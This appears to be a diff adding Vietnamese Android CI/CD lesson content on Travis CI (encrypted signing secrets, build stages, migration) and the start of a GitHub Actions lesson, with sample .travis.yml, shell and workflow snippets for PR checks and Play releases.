+<p><strong>Bài toán:</strong> job release cần <code>app/release.jks</code> và khoá service account của Google Play (<a href="github_ci.md" target="_blank" rel="noopener">11.4</a>), nhưng không file nào được commit ở dạng gốc.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Gộp hai file thành <code>secrets.tar</code>.</li>
+  <li><code>travis encrypt-file secrets.tar --add</code>: tạo <code>secrets.tar.enc</code>, lưu cặp khoá vào Repository Settings, thêm lệnh <code>openssl</code> vào <code>.travis.yml</code>.</li>
+  <li>Commit <code>secrets.tar.enc</code>; file gốc vào <code>.gitignore</code>, cất ở kho secret của team.</li>
+  <li>Thêm <code>RELEASE_STORE_PASSWORD</code>, <code>RELEASE_KEY_ALIAS</code>, <code>RELEASE_KEY_PASSWORD</code> và <code>GITHUB_RELEASE_TOKEN</code> vào Repository Settings.</li>
+  <li>Job release giải mã bằng <code>openssl</code>, giải nén ra đúng hai file.</li>
+</ol>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="bash"><code># Gốc repo, macOS hoặc Linux (Windows: dùng WSL)
+tar cvf secrets.tar app/release.jks play-service-account.json      # (1)
+travis login --com
+travis encrypt-file secrets.tar --add                              # (2)
+printf '%s\\n' secrets.tar app/release.jks play-service-account.json &gt;&gt; .gitignore   # (3)
+git add secrets.tar.enc .travis.yml .gitignore</code></pre>
+
+<p><strong>Kết quả:</strong> Repository Settings có cặp <code>encrypted_...</code> và các biến bước (4), giá trị ẩn; log job release chỉ hiện tên biến, không có giá trị khoá.</p>
+
+<h3>Build stage và điều kiện</h3>
+
+<ul>
+  <li><strong><code>stages:</code></strong> định thứ tự stage; job cùng stage chạy song song, stage sau chỉ chạy khi stage trước xanh. Job không ghi stage rơi vào stage mặc định <code>test</code>.</li>
+  <li><strong><code>if:</code></strong> đặt điều kiện cho build, stage hoặc job: <code>if: type = pull_request</code>, <code>if: tag =~ ^v</code>. Với PR, <code>branch</code> là nhánh đích.</li>
+  <li><strong><code>branches.only</code></strong> cũng lọc tag: chỉ ghi <code>main</code> thì build trên tag <code>v*</code> không chạy.</li>
+  <li><strong><code>deploy:</code></strong> dùng provider (<code>releases</code> cho GitHub Releases, <code>script</code> cho lệnh tuỳ ý; không có provider Google Play). Docs provider vẫn ghi <code>edge: true</code> để opt in dpl v2 (không dọn working directory); dpl v1 chạy <code>git stash --all</code>, xoá file build, trừ khi <code>skip_cleanup: true</code>.</li>
+  <li><strong>Artifact:</strong> không có kho tích hợp; addon <code>artifacts</code> upload lên Amazon S3, không chạy cho PR build.</li>
+</ul>
+
+<h3>Migrate sang GitHub Actions</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;"><code>.travis.yml</code></th>
+      <th style="padding:8px 12px;text-align:left;">GitHub Actions (<a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Push, PR build</td>
+      <td style="padding:8px 12px;"><code>on: pull_request</code>, <code>on: push</code> với <code>tags</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Job, matrix, <code>jobs.include</code></td>
+      <td style="padding:8px 12px;"><code>jobs:</code>, <code>strategy.matrix</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Phase cố định</td>
+      <td style="padding:8px 12px;"><code>steps</code> tự sắp (<code>uses:</code> hoặc <code>run:</code>)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>language: android</code>, <code>jdk</code>, <code>android.components</code></td>
+      <td style="padding:8px 12px;">Runner có sẵn Android SDK + <code>actions/setup-java</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>cache</code> + <code>before_cache</code></td>
+      <td style="padding:8px 12px;"><code>gradle/actions/setup-gradle</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>env</code>, <code>secure:</code>, Repository Settings</td>
+      <td style="padding:8px 12px;"><code>env:</code>, repository/environment secrets</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>travis encrypt-file</code></td>
+      <td style="padding:8px 12px;">Secret <code>RELEASE_KEYSTORE_BASE64</code>, giải mã bằng <code>base64 --decode</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>stages</code> + <code>if:</code></td>
+      <td style="padding:8px 12px;"><code>needs:</code> + <code>if:</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>deploy</code> trên tag</td>
+      <td style="padding:8px 12px;">Job release trên tag, environment có reviewer</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>TRAVIS_BUILD_NUMBER</code></td>
+      <td style="padding:8px 12px;"><code>GITHUB_RUN_NUMBER</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Các bước chuyển:</p>
+
+<ol>
+  <li><strong>Kiểm kê</strong> job, điều kiện, secret, provider. <code>gh actions-importer audit travis-ci --output-dir tmp/audit</code> sinh báo cáo và bản nháp workflow; secret phải chuyển tay.</li>
+  <li><strong>Lấy secret gốc:</strong> cặp <code>encrypted_*</code> không đọc lại được, <code>secrets.tar.enc</code> vô dụng ngoài Travis. Tạo <code>RELEASE_KEYSTORE_BASE64</code>, <code>PLAY_SERVICE_ACCOUNT_JSON</code> từ bản gốc.</li>
+  <li><strong>Chạy song song</strong> PR check mới với Travis vài ngày, rồi đổi required status check của <code>main</code> sang check mới.</li>
+  <li><strong>Chuyển release:</strong> <code>GITHUB_RUN_NUMBER</code> bắt đầu từ 1, nên cộng offset lớn hơn versionCode cuối đã lên Play (11.4).</li>
+  <li><strong>Dọn dẹp:</strong> xoá <code>.travis.yml</code>, <code>secrets.tar.enc</code>, badge; tắt repo trên Travis; xoay vòng secret từng nằm trên Travis.</li>
+</ol>
+
+<h2>Ví dụ thực tế</h2>
+
+<p>Bài toán chính là PR check, kèm phác thảo release; migrate theo năm bước ở trên.</p>
+
+<h3>PR check cho app Android</h3>
+
+<p><strong>Bài toán:</strong> mỗi Pull Request vào <code>main</code> chạy lint, unit test và build APK debug; đỏ thì không merge; không cần secret để PR từ fork cũng chạy.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>PR build chạy trên merge commit; push chỉ build <code>main</code> và tag <code>v*</code>.</li>
+  <li>Jammy, JDK 17; tải cache Gradle, cài platform và build-tools khớp <code>compileSdk</code>.</li>
+  <li><code>script</code> chạy lint, unit test, build; <code>--continue</code> để lint lỗi vẫn chạy test.</li>
+  <li><code>before_cache</code> xoá lock file, upload cache nếu đổi.</li>
+  <li>Kết quả thành check trên PR; đỏ thì chặn merge.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    A["(1) Pull Request vào main"] --&gt; B["(2) Jammy, JDK 17, cache, SDK component"]
+    B --&gt; C["(3) lintDebug, testDebugUnitTest, assembleDebug"]
+    C --&gt; D["(4) before_cache, upload cache"]
+    D --&gt; E{"(5) script thành công?"}
+    E --&gt;|"Có"| F["Check xanh, được merge"]
+    E --&gt;|"Không"| G["Check đỏ, chặn merge"]
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># .travis.yml
+language: android
+dist: jammy                          # (2)
+jdk: openjdk17                       # (2) Jammy mặc định JDK 11
+
+android:
+  components:                        # (2) khớp compileSdk của dự án
+    - platform-tools
+    - platforms;android-35
+    - build-tools;35.0.0
+
+branches:
+  only:                              # (1) push: main và tag v*; PR: nhánh đích main
+    - main
+    - /^v\\d+\\.\\d+\\.\\d+.*$/
+
+script:                              # (3) ghi đè "build connectedCheck"
+  - ./gradlew lintDebug testDebugUnitTest assembleDebug --continue
+
+before_cache:                        # (4)
+  - rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock
+  - rm -fr $HOME/.gradle/caches/*/plugin-resolution/
+cache:
+  directories:
+    - $HOME/.gradle/caches/
+    - $HOME/.gradle/wrapper/
+    - $HOME/.android/build-cache</code></pre>
+
+<p>Task: <a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>; có flavor thì theo <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>.</p>
+
+<p><strong>Kết quả:</strong> PR có test sai thì log hiện <code>testDebugUnitTest FAILED</code>, check đỏ, nút merge bị khoá (khi đã đặt required check); push bản sửa thì xanh. Build sau nhanh hơn nhờ cache.</p>
+
+<div class="callout callout-note"><span class="callout-icon">ℹ️</span><div class="callout-body">Khác PR check chuẩn, Travis không lưu report và APK debug của PR build làm artifact; report lint đầy đủ phải chạy lại ở local.</div></div>
+
+<h3>Phác thảo: release khi push tag <code>v*</code></h3>
+
+<p>App cấu hình như <a href="github_ci.md" target="_blank" rel="noopener">11.4</a>: ký bằng biến <code>RELEASE_*</code>, <code>versionCode</code> từ Gradle property, Gradle Play Publisher (track <code>internal</code>, khoá từ <code>ANDROID_PUBLISHER_CREDENTIALS</code>). Thêm vào file trên:</p>
+
+<pre data-lang="yaml"><code>stages:
+  - test                             # job PR check ở cấp gốc (jdk là key matrix) rơi vào stage mặc định này
+  - name: release
+    if: tag =~ ^v
+
+jobs:
+  include:
+    - stage: release
+      before_install:                # giải mã chỉ trong job này
+        - openssl aes-256-cbc -K $encrypted_0a6446eb3ae3_key -iv $encrypted_0a6446eb3ae3_iv -in secrets.tar.enc -out secrets.tar -d
+        - tar xf secrets.tar
+      script: ./gradlew bundleRelease -PversionCode=$TRAVIS_BUILD_NUMBER
+      before_deploy:
+        - export ANDROID_PUBLISHER_CREDENTIALS="$(cat play-service-account.json)"
+      deploy:
+        - provider: releases         # AAB và mapping.txt lên GitHub Release
+          token: $GITHUB_RELEASE_TOKEN
+          file:
+            - app/build/outputs/bundle/release/app-release.aab
+            - app/build/outputs/mapping/release/mapping.txt
+          edge: true
+          on:
+            tags: true
+        - provider: script           # upload AAB đã build lên internal track, không build lại
+          script: ./gradlew publishReleaseBundle --artifact-dir app/build/outputs/bundle/release
+          edge: true
+          on:
+            tags: true
+      after_script:
+        - rm -f secrets.tar app/release.jks play-service-account.json</code></pre>
+
+<p>Job release build lại từ đầu vì không chia sẻ file với stage <code>test</code>. Kiểm chứng: push tag <code>v2.4.0</code>, build có hai stage, GitHub Release có AAB và <code>mapping.txt</code>, internal track có bản mới.</p>
+
+<h2>Khi nào nên và không nên dùng</h2>
+
+<p><strong>Nên (hoặc chấp nhận được):</strong> dự án đang chạy ổn trên <code>travis-ci.com</code> có trả phí, chỉ cần nâng <code>dist</code>, JDK, component; tổ chức đã dùng Travis CI Server.</p>
+
+<p><strong>Không nên:</strong> dự án Android mới (<a href="github_ci.md" target="_blank" rel="noopener">11.4</a> hoặc <a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a> phù hợp hơn); cần artifact mỗi PR, emulator thường xuyên hay upload Play có sẵn (trên Travis phải tự dựng); repo open source cần CI miễn phí.</p>
+
+<h2>Sai lầm thường gặp</h2>
+
+<h3>1. Tưởng repo vẫn đang được build</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> badge <code>travis-ci.org</code> vẫn hiện trạng thái cũ; PR merge không có check nào.</p>
+
+<p><strong>Cách sửa:</strong> xem tab Checks của PR gần nhất; không có check Travis thì migrate hoặc kích hoạt lại trên <code>travis-ci.com</code>.</p>
+
+<h3>2. Tin rằng component đã cài xong</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> gõ sai <code>platform;android-35</code>, log chỉ có dòng <code>installation failed</code> rồi chạy tiếp; lỗi lộ muộn ở Gradle, hoặc AGP tự tải package.</p>
+
+<p><strong>Cách sửa:</strong> đối chiếu tên với <code>sdkmanager --list</code>; đọc phần <code>android.install</code> của log khi đổi component.</p>
+
+<h3>3. <code>branches.only</code> chặn build trên tag</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> push tag <code>v2.4.0</code> mà không có build.</p>
+
+<p><strong>Cách sửa:</strong> thêm regex tag vào <code>branches.only</code> như ví dụ PR check.</p>
+
+<h3>4. Để lệnh giải mã ở <code>before_install</code> cấp gốc</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> <code>--add</code> chèn lệnh giải mã vào <code>before_install</code> cấp gốc, chạy cho mọi job; PR từ fork không có khoá nên errored ở <code>openssl</code>.</p>
+
+<p><strong>Cách sửa:</strong> chuyển lệnh giải mã vào riêng job release như phác thảo release.</p>
+
+<h2>Lịch sử phát triển</h2>
+
+<ul>
+  <li><strong>2011:</strong> Travis CI ra đời, miễn phí cho repo public qua <code>travis-ci.org</code>.</li>
+  <li><strong>05/2018:</strong> repo public được build trên <code>travis-ci.com</code>.</li>
+  <li><strong>01/2019:</strong> Idera mua lại Travis CI.</li>
+  <li><strong>02/11/2020:</strong> tính phí theo credit.</li>
+  <li><strong>06/2021:</strong> <code>travis-ci.org</code> bị tắt.</li>
+  <li><strong>09/2021:</strong> CVE-2021-41077 làm lộ secret của repo public cho build từ fork.</li>
+  <li><strong>03/2025:</strong> <code>travis-build</code> hỗ trợ <code>language: android</code> trên Bionic, Focal, Jammy và bỏ Trusty.</li>
+</ul>
+
+<h2>Kết nối hệ thống</h2>
+
+<ul>
+  <li><strong>Tiên quyết:</strong> <a href="index.md" target="_blank" rel="noopener">Session 11 Overview</a>; <a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> (secret, ký release, versionCode, track); <a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a>.</li>
+  <li><strong>Liên quan:</strong> <a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>, <a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a>, <a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>, <a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>.</li>
+  <li><strong>Học tiếp:</strong> <a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> khi migrate.</li>
+</ul>
+
+<h2>Tham khảo</h2>
+
+<ul>
+  <li><a href="https://docs.travis-ci.com/user/languages/android/" target="_blank" rel="noopener">Build an Android Project - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/job-lifecycle/" target="_blank" rel="noopener">Job Lifecycle - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/reference/jammy/" target="_blank" rel="noopener">Ubuntu Jammy Build Environment - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/environment-variables/" target="_blank" rel="noopener">Environment Variables - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/encrypting-files/" target="_blank" rel="noopener">Encrypting Files - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/best-practices-security/" target="_blank" rel="noopener">Best Practices in Securing Your Data - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/build-stages/" target="_blank" rel="noopener">Build Stages - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/deployment-v2/providers/releases/" target="_blank" rel="noopener">GitHub Releases provider (dpl v2) - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/billing-overview/" target="_blank" rel="noopener">Billing Overview - Travis CI Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/migrate/open-source-repository-migration" target="_blank" rel="noopener">Migrating repositories to travis-ci.com - Travis CI Docs</a></li>
+  <li><a href="https://github.com/travis-ci/travis-build/blob/master/lib/travis/build/script/android.rb" target="_blank" rel="noopener">travis-build: script/android.rb - GitHub</a></li>
+  <li><a href="https://docs.github.com/en/actions/tutorials/migrate-to-github-actions/manual-migrations/migrate-from-travis-ci" target="_blank" rel="noopener">Migrating from Travis CI to GitHub Actions - GitHub Docs</a></li>
+  <li><a href="https://docs.github.com/en/actions/tutorials/migrate-to-github-actions/automated-migrations/travis-ci-migration" target="_blank" rel="noopener">Migrating from Travis CI with GitHub Actions Importer - GitHub Docs</a></li>
+</ul>
+    `
+  },
+
+  'github-ci': {
+    title: 'Github CI',
+    summary: 'GitHub Actions là nền tảng CI/CD tích hợp trong GitHub, nơi mỗi workflow là một file YAML trong .github/workflows/ mô tả khi một event xảy ra trên repo thì chạy những job nào, mỗi job là chuỗi step chạy trên một runner. Bài dựng PR check chặn merge, pipeline Release đẩy AAB đã ký lên Google Play, và dạy Publish Store: service account, track, staged rollout, promote.',
+    status: 'published',
+    difficulty: 'intermediate',
+    estimatedReadingTime: '23 phút',
+    depth: 'deep-dive',
+    tags: ['android', 'session-11', 'cicd', 'github-actions', 'google-play', 'play-publishing', 'app-signing', 'staged-rollout'],
+    domain: 'Android',
+    module: 'Session 11',
+    prerequisites: ['android.cicd.overview', 'android.manifest.build_types', 'android.output_packages.aab_files', 'android.testing.lint', 'android.testing.unit_testing'],
+    related: ['android.manifest.product_flavors', 'android.manifest.plugin', 'android.output_packages.apk_files', 'android.testing.fit_bug_optimization', 'android.coding_analyst.overview', 'android.cicd.jenkins', 'android.cicd.bitrise', 'android.cicd.travis_ci'],
+    learningOutcomes: [
+      'Giải thích được mô hình của GitHub Actions gồm workflow, event, job, step, runner, action, và cách needs, if, concurrency, permissions điều khiển một lần chạy.',
+      'Triển khai được pipeline PR check chạy lint, unit test, build debug, lưu report làm artifact và chặn merge bằng required status check.',
+      'Áp dụng được secret để ký bản release trên CI bằng keystore base64, signingConfigs.release đọc biến môi trường và versionCode lấy từ số lần chạy.',
+      'Triển khai được pipeline Release đẩy AAB đã ký lên internal track của Google Play bằng service account, qua environment có người duyệt.',
+      'Phân biệt được các track của Google Play, staged rollout và cách promote một release từ internal lên production.'
+    ],
+    knowledgeGap: 'Nhiều team chép file workflow mà không hiểu nó chạy thế nào: PR đỏ vẫn merge được vì chưa bật required status check, keystore nằm trong repo hoặc lộ ra log, versionCode tăng tay nên Play từ chối, phát hành vẫn là một người build trên máy mình rồi kéo thả AAB. Hệ quả: bản lỗi lọt vào main, khoá ký có nguy cơ lộ, mỗi lần phát hành phụ thuộc một máy, một người.',
+    updatedAt: '2026-11-10',
+    readTime: '23 phút',
+    content: `
+<p>Mục <strong>Github CI</strong> trong mục lục là <strong>GitHub Actions</strong>, dịch vụ CI/CD có sẵn trong GitHub. Đây là bài chính của Session 11: hiện thực pipeline Android của <a href="index.md" target="_blank" rel="noopener">11.0 Tổng quan</a> bằng GitHub Actions, từ commit tới Google Play.</p>
+
+<h2>Vấn đề cần giải quyết</h2>
+
+<p>Một app Android có ba việc lặp lại ở mọi thay đổi, và làm tay thì mỗi việc hỏng một kiểu:</p>
+
+<ul>
+  <li><strong>Kiểm tra trước khi merge.</strong> Lint, unit test, build (<a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>) chỉ có tác dụng khi chạy ở <strong>mọi</strong> Pull Request, trên máy sạch, và <strong>chặn</strong> merge khi đỏ.</li>
+  <li><strong>Ký bản release.</strong> Bản lên Play phải ký bằng upload key (<a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a>). Keystore ở máy một người thì phát hành phụ thuộc người đó; nằm trong repo thì ai đọc repo cũng ký được app.</li>
+  <li><strong>Đưa bản build lên Google Play.</strong> Kéo thả AAB, tự tăng <code>versionCode</code>: dễ trùng số, hoặc phát hành cho 100% người dùng một bản chưa ai thử.</li>
+</ul>
+
+<p>Cần <strong>biến ba việc đó thành quy trình máy chạy theo sự kiện trên repo</strong>: secret được bảo vệ, có người duyệt trước phát hành, bản build tới người dùng theo nhóm tăng dần.</p>
+
+<h2>Sau khi học xong</h2>
+
+<ul>
+  <li>Giải thích được mô hình của GitHub Actions gồm workflow, event, job, step, runner, action, và cách needs, if, concurrency, permissions điều khiển một lần chạy.</li>
+  <li>Triển khai được pipeline PR check chạy lint, unit test, build debug, lưu report làm artifact và chặn merge bằng required status check.</li>
+  <li>Áp dụng được secret để ký bản release trên CI bằng keystore base64, signingConfigs.release đọc biến môi trường và versionCode lấy từ số lần chạy.</li>
+  <li>Triển khai được pipeline Release đẩy AAB đã ký lên internal track của Google Play bằng service account, qua environment có người duyệt.</li>
+  <li>Phân biệt được các track của Google Play, staged rollout và cách promote một release từ internal lên production.</li>
+</ul>
+
+<h2>GitHub Actions là gì?</h2>
+
+<p><strong>GitHub Actions</strong> là nền tảng CI/CD tích hợp trong GitHub: mỗi <strong>workflow</strong> là một file YAML trong <code>.github/workflows/</code> mô tả <strong>khi một event xảy ra trên repo</strong> (mở PR, push tag, bấm nút chạy tay) thì chạy những <strong>job</strong> nào; mỗi job là một chuỗi <strong>step</strong> chạy tuần tự trên một <strong>runner</strong> (máy ảo do GitHub cấp hoặc máy của bạn).</p>
+
+<p>Mental model: workflow là <strong>một dây chuyền có công tắc</strong>. Event là công tắc; mỗi job là một <strong>trạm</strong> trên máy riêng; step là từng thao tác tại trạm; <code>needs</code> nối trạm sau trạm trước; <strong>artifact</strong> là hàng hoá chuyển ra khỏi trạm (report, APK, AAB).</p>
+
+<h2>Cách hoạt động</h2>
+
+<h3>Mô hình: workflow, event, job, step, runner</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Khái niệm</th>
+      <th style="padding:8px 12px;text-align:left;">Là gì</th>
+      <th style="padding:8px 12px;text-align:left;">Viết ở đâu trong YAML</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Workflow</td>
+      <td style="padding:8px 12px;">Một file <code>.github/workflows/*.yml</code>; repo có thể có nhiều workflow</td>
+      <td style="padding:8px 12px;">cả file</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Event</td>
+      <td style="padding:8px 12px;">Sự kiện kích hoạt workflow</td>
+      <td style="padding:8px 12px;"><code>on:</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Job</td>
+      <td style="padding:8px 12px;">Nhóm step chạy trên <strong>một</strong> runner; các job mặc định chạy song song</td>
+      <td style="padding:8px 12px;"><code>jobs.&lt;id&gt;</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Step</td>
+      <td style="padding:8px 12px;">Một thao tác: gọi một action (<code>uses:</code>) hoặc chạy lệnh shell (<code>run:</code>)</td>
+      <td style="padding:8px 12px;"><code>jobs.&lt;id&gt;.steps</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Runner</td>
+      <td style="padding:8px 12px;">Máy chạy job; <code>ubuntu-latest</code> là máy ảo Linux có sẵn JDK, Android SDK, huỷ sau job</td>
+      <td style="padding:8px 12px;"><code>runs-on:</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Action</td>
+      <td style="padding:8px 12px;">Logic đóng gói sẵn để tái dùng (checkout, cài JDK, cache)</td>
+      <td style="padding:8px 12px;"><code>uses: owner/repo@version</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Event hay dùng: <code>pull_request</code> (mở PR, push thêm commit; lọc nhánh đích bằng <code>branches:</code>), <code>push</code> với <code>tags:</code> (tag khớp mẫu <code>v*</code>, trigger của bản phát hành), <code>workflow_dispatch</code> (nút "Run workflow", có <code>inputs</code>), <code>schedule</code> (cron).</p>
+
+<p><strong><code>uses:</code> và <code>run:</code></strong> khác ở chỗ ai viết logic: <code>run:</code> chạy lệnh shell của bạn, <code>uses:</code> chạy code người khác với quyền của job, nên phải pin version (mục dưới).</p>
+
+<p>Một lần chạy:</p>
+
+<ol>
+  <li>Event xảy ra; GitHub tìm mọi workflow có <code>on:</code> khớp.</li>
+  <li>Mỗi workflow tạo một <strong>workflow run</strong>; mỗi job lên một runner trống.</li>
+  <li>Runner chạy lần lượt các step; step lỗi thì các step sau bị bỏ, trừ step có <code>if</code> cho phép.</li>
+  <li>Kết quả job thành <strong>check</strong> trên commit/PR; file cần giữ thành artifact.</li>
+</ol>
+
+<div class="mermaid">
+flowchart LR
+    E["(1) Event&lt;br/&gt;pull_request, push tag"] --&gt; W["(2) Workflow run&lt;br/&gt;.github/workflows/pr-check.yml"]
+    W --&gt; J1["(2) Job build&lt;br/&gt;runner ubuntu-latest"]
+    W --&gt; J2["(2) Job khác&lt;br/&gt;runner riêng"]
+    J1 --&gt; S["(3) Step 1, 2, 3...&lt;br/&gt;uses hoặc run"]
+    S --&gt; R["(4) Check trên PR&lt;br/&gt;và artifact"]
+</div>
+
+<h3>Điều khiển lần chạy: needs, if, concurrency, permissions</h3>
+
+<ul>
+  <li><strong><code>needs: build</code></strong>: job chỉ bắt đầu khi job <code>build</code> thành công; không có <code>needs</code> thì chạy song song.</li>
+  <li><strong><code>if:</code></strong>: điều kiện cho job hoặc step, ví dụ <code>github.event_name == 'push'</code>; hàm trạng thái <code>success()</code> (mặc định), <code>failure()</code>, <code>always()</code>, <code>cancelled()</code>. Job bị bỏ qua vì <code>if</code> có trạng thái <strong>skipped</strong> và không chặn required check.</li>
+  <li><strong><code>concurrency:</code></strong>: các lần chạy cùng <code>group</code> không chạy chồng nhau. PR đặt <code>cancel-in-progress: true</code> để commit mới huỷ lần chạy cũ; release để <code>false</code>, không huỷ upload lên Play đang dở.</li>
+  <li><strong><code>permissions:</code></strong>: mỗi job nhận một <code>GITHUB_TOKEN</code> tạm thời; quyền mặc định tuỳ cấu hình repo hoặc organization, nên khai báo tường minh mức tối thiểu, thường <code>contents: read</code>.</li>
+</ul>
+
+<h3>Pin version của action</h3>
+
+<p><code>@v7</code> là <strong>tag major</strong>, tác giả dời theo mỗi bản vá; <code>@v7.0.1</code> cũng là tag, vẫn dời được; chỉ <strong>full commit SHA</strong> (<code>@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1</code>) là bất biến, và GitHub khuyên pin SHA cho action bên thứ ba. Thực tế phổ biến: <code>actions/*</code> và Gradle dùng tag major, action cộng đồng pin SHA, Dependabot mở PR cập nhật:</p>
+
+<pre data-lang="yaml"><code># .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    schedule:
+      interval: weekly</code></pre>
+
+<p>Version trong bài (11/2026): <code>actions/checkout@v7</code>, <code>actions/setup-java@v6</code>, <code>gradle/actions/setup-gradle@v6</code>, <code>actions/upload-artifact@v7</code>, <code>reactivecircus/android-emulator-runner@v2</code>.</p>
+
+<h3>Pipeline PR check</h3>
+
+<p>PR check là pipeline chuẩn thứ nhất của <a href="index.md" target="_blank" rel="noopener">11.0</a>. Hai action cần hiểu:</p>
+
+<ul>
+  <li><strong><code>actions/setup-java</code></strong> cài JDK theo <code>distribution</code> và <code>java-version</code>. Tuỳ chọn <code>cache: gradle</code> của nó đơn giản hơn; đừng bật cùng lúc với <code>setup-gradle</code>.</li>
+  <li><strong><code>gradle/actions/setup-gradle</code></strong> cache Gradle User Home, mặc định chỉ <strong>ghi</strong> cache ở nhánh mặc định, chỉ <strong>đọc</strong> ở nhánh khác và PR, nên PR không làm bẩn cache của <code>main</code>. Nó cũng mặc định <strong>kiểm tra Gradle Wrapper</strong> (<code>validate-wrappers: true</code>): so checksum <code>gradle-wrapper.jar</code> với bản chính thức, chặn PR thay jar độc hại.</li>
+</ul>
+
+<div class="callout callout-note"><span class="callout-icon">ℹ️</span><div class="callout-body">Từ <code>gradle/actions</code> v6 (03/2026), cache mặc định (<code>cache-provider: enhanced</code>) là thành phần độc quyền <code>gradle-actions-caching</code>: miễn phí cho repo public, đang là Free Preview cho repo private; dùng v6 là chấp nhận Terms of Use của Gradle. Không muốn thì đặt <code>cache-provider: basic</code> (bản MIT).</div></div>
+
+<h4>Ví dụ: kiểm tra mọi Pull Request vào main</h4>
+
+<p><strong>Bài toán:</strong> mọi PR vào <code>main</code> phải được lint, test, build trên máy sạch, có report xem được, và QA tải được APK debug của PR.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Mở PR vào <code>main</code> hoặc push thêm commit: event <code>pull_request</code> kích hoạt workflow.</li>
+  <li><code>concurrency</code> huỷ lần chạy cũ của PR; <code>permissions</code> giới hạn token ở quyền đọc.</li>
+  <li>Checkout code của PR, cài JDK 17.</li>
+  <li><code>setup-gradle</code> kiểm tra wrapper, khôi phục cache từ <code>main</code>.</li>
+  <li>Gradle chạy lint, unit test, build debug; <code>--continue</code> để task đỏ không chặn task độc lập khác.</li>
+  <li>Report luôn được upload (kể cả khi bước 5 đỏ); APK debug chỉ khi build xanh.</li>
